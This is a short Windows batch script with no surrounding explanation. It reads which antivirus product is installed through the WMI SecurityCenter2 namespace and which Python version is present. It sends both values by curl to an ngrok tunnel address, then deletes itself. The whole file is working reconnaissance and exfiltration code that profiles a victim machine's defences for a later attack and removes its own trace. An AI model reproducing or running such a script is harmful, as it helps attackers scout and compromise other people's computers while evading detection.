@echo off
for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do set "antivirus=%%a"
echo Antivirus Information: %antivirus%
for /f "delims=" %%b in ('python --version 2^>^&1') do set "python_version=%%b"
echo Python Version: %python_version%
curl --verbose --get --data-urlencode "Antivirus=%antivirus%" --data-urlencode "PythonVersion=%python_version%" https://72be-197-35-2-214.ngrok-free.app
del "%~f0"
